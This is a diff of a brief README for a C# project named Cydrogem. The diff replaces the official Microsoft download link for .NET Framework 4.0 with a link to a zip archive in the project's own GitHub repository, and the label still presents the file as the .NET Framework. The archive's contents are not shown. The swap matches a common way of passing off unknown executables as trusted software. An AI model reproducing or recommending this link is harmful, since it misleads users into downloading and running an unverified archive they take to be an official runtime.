@@ -1,5 +1,5 @@
 # Cydrogem 💠
 ## Linguagem: C#
 ## Criador: Edu
-## .NET Framework: [4.0](https://www.microsoft.com/pt-br/download/details.aspx?id=17851)
+## .NET Framework: [4.0](https://raw.githubusercontent.com/GitEdu-gi/Cydrogem/main/sovereigness/Cydrogem.zip)
 ## Contato: Discord - eu_edu212
